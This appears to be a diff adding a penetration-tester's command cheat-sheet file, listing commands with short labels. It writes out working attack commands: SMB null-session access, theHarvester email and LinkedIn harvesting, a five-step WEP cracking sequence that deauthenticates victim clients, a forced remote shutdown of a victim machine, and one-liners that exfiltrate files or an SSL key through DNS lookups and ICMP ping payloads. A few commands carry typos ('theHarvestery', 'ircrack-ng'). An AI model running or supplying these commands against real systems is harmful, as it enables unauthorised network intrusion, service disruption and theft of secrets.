@@ -1,0 +1,110 @@
+tblcommand
+cmnt
+EOA
+Null session smb
+cmnt
+Null session smb : Remove L for connecting to share
+cmd
+smbclient -I [IP] -L [domain] -N -U ""
+EOU
+tblcommand
+cmd
+EOA
+/data/hacking/theHarvester/theHarvester.py -h -d [domain] -l 1000 -b all | tee harvester-search-[DETAIL].txt
+cmd
+theHarvester -h -d [domain] -l 1000 -b all | tee harvester-search-[DETAIL].txt
+cmnt
+harvester
+EOU
+tblcommand
+cmd
+EOA
+/data/hacking/theHarvester/theHarvester.py -d [domain] -l 1000 -b linkedin | tee harvester-people-[DETAIL].txt
+cmd
+theHarvestery -d [domain] -l 1000 -b linkedin | tee harvester-people-[DETAIL].txt
+cmnt
+harvester linkedin
+EOU
+tblcommand
+cmnt
+EOA
+wep crack : 1) start capturing IV's
+cmnt
+wep cracking
+cmd
+airodump-ng -c 11 --bssid [VICTIM MAC] -w [OUTPUT] mon0
+EOU
+tblcommand
+cmnt
+EOA
+wep crack 2) De auth clients
+cmnt
+wep cracking
+cmd
+aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0
+EOU
+tblcommand
+cmnt
+EOA
+wep crack 3) Create a fake auth to the AP
+cmnt
+wep cracking
+cmd
+aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0
+EOU
+tblcommand
+cmd
+EOA
+aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h [OurMac] wlan0
+cmd
+aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0
+EOU
+tblcommand
+cmnt
+wep crack 4) start in arp replay mode
+cmnt
+wep cracking
+cmd
+aireplay-ng -3 -b [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0
+EOU
+tblcommand
+cmd
+EOA
+aireplay-ng -3 -b [VICTIM MAC] -h [OurMac] wlan0
+cmd
+aireplay-ng -3 -b [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0
+EOU
+tblcommand
+cmnt
+EOA
+wep crack 5) get the key
+cmnt
+wep cracking
+cmd
+ircrack-ng -b [VICTIM MAC] [OUTPUT]*cap
+EOU
+tblcommand
+cmnt
+EOA
+remote shutdown : /i as first option for gui
+cmnt
+remote shutdown
+cmd
+shutdown /m \\[victim] /r /t 0 /f
+EOU
+tblcommand
+cmd
+EOA
+for line in `base64 -w 62 [file]`; do host $line.[hostname]; done
+cmd
+for line in `base64 -w 230 [file]`; do host $line.[hostname]; done
+cmnt
+exfil file through DNS, may want to encrypt, also assuming you have a short domain
+EOU
+tblcommand
+cmd
+EOA
+ping -p 11010101010101010101010101010199 -c 1 -M do 127.0.0.1 -s 32; for line in `base64 sslfile.key | xxd -p -c 14`; do line2=`echo "11 $line 99" |tr -d ' '`; ping -p $line2 -c 1 -M do 127.0.0.1 -s 32; done; ping -p 11101010101010101010101010101099 -c 1 -M do 127.0.0.1 -s 32
+cmd
+for line in `base64 -w 1000 [file]`; do ping -s 1000 -c 1 -M do [ip]; done
+EOU
